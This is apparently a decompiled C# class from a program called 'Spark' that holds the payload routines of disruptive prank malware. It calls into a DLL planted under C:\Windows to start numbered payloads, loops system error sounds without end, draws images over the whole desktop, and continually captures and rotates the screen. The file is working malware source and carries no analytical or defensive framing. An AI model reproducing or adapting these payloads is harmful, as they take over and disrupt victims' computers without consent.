using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Spark.Properties;

namespace Spark
{
	// Token: 0x02000007 RID: 7
	internal class Standard
	{
		// Token: 0x0600001F RID: 31
		[DllImport("C:\\Windows\\File Cache\\DLL.dll", CharSet = CharSet.Unicode, EntryPoint = "?StartProcPayload@Export@SparkDLL@@QAEXH@Z")]
		public static extern void StartProcPayload(int payload);

		// Token: 0x06000020 RID: 32
		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x06000021 RID: 33 RVA: 0x00002759 File Offset: 0x00000959
		public static void ShowAllWindows()
		{
			if (!Variables.ShowAllWindowsRan)
			{
				Standard.StartProcPayload(1);
			}
			Variables.ShowAllWindowsRan = true;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x0000276E File Offset: 0x0000096E
		public static void SendMessagePayload()
		{
			if (!Variables.SendMessageRunning)
			{
				Standard.StartProcPayload(2);
			}
			Variables.SendMessageRunning = true;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002784 File Offset: 0x00000984
		public static void ErrorSounds()
		{
			if (Variables.ErrorSoundsRunning)
			{
				return;
			}
			Variables.ErrorSoundsRunning = true;
			for (;;)
			{
				int num = new Random().Next(2);
				if (num != 0)
				{
					if (num == 1)
					{
						SystemSounds.Hand.Play();
					}
				}
				else
				{
					SystemSounds.Exclamation.Play();
				}
				Thread.Sleep(400);
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000027D8 File Offset: 0x000009D8
		public static void GlitchCards()
		{
			Graphics graphics = Graphics.FromHdc(Standard.GetDC(IntPtr.Zero));
			Random random = new Random();
			Bitmap bitmap = null;
			Bitmap image = null;
			Point point = default(Point);
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			bool flag = true;
			bool flag2 = true;
			for (;;)
			{
				switch (random.Next(4))
				{
				case 0:
					bitmap = Resources.Card1;
					image = new Bitmap(Resources.Card1);
					break;
				case 1:
					bitmap = Resources.Card2;
					image = new Bitmap(Resources.Card2);
					break;
				case 2:
					bitmap = Resources.Card3;
					image = new Bitmap(Resources.Card3);
					break;
				case 3:
					bitmap = Resources.Card4;
					image = new Bitmap(Resources.Card4);
					break;
				}
				graphics.DrawImage(image, point.X, point.Y);
				if (flag)
				{
					if (point.X >= width - bitmap.Width)
					{
						flag = false;
					}
					point.X += bitmap.Width / 4;
				}
				else
				{
					if (point.X <= 0)
					{
						flag = true;
					}
					point.X -= bitmap.Width / 4;
				}
				if (flag2)
				{
					if (point.Y >= height - bitmap.Height)
					{
						flag2 = false;
					}
					point.Y += bitmap.Height / 4;
				}
				else
				{
					if (point.Y <= 0)
					{
						flag2 = true;
					}
					point.Y -= bitmap.Height / 4;
				}
				Thread.Sleep(2);
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x0000296C File Offset: 0x00000B6C
		public static void ShootingStars()
		{
			Graphics graphics = Graphics.FromHdc(Standard.GetDC(IntPtr.Zero));
			Point point = default(Point);
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap star = Resources.Star;
			Bitmap image = new Bitmap(Resources.Star);
			if (Variables.ShootingStarsRunning)
			{
				return;
			}
			for (;;)
			{
				Thread.Sleep(10);
				graphics.DrawImage(image, point.X, point.Y);
				if (point.Y > height)
				{
					point.Y = 0;
				}
				if (point.X > width)
				{
					point.X = 0;
				}
				point.X += 32;
				point.Y += 24;
				Thread.Sleep(2);
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002A3C File Offset: 0x00000C3C
		public static void PrintRotate()
		{
			int num = 0;
			for (;;)
			{
				IntPtr dc = Standard.GetDC(IntPtr.Zero);
				Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
				Graphics graphics = Graphics.FromImage(image);
				graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
				graphics = Graphics.FromHdc(dc);
				if (num < 9)
				{
					graphics.RotateTransform((float)(num * 10));
					graphics.DrawImage(image, 0, 0);
				}
				else
				{
					graphics.RotateTransform(-90f);
					num = 0;
				}
				num++;
				Thread.Sleep(500);
			}
		}
	}
}
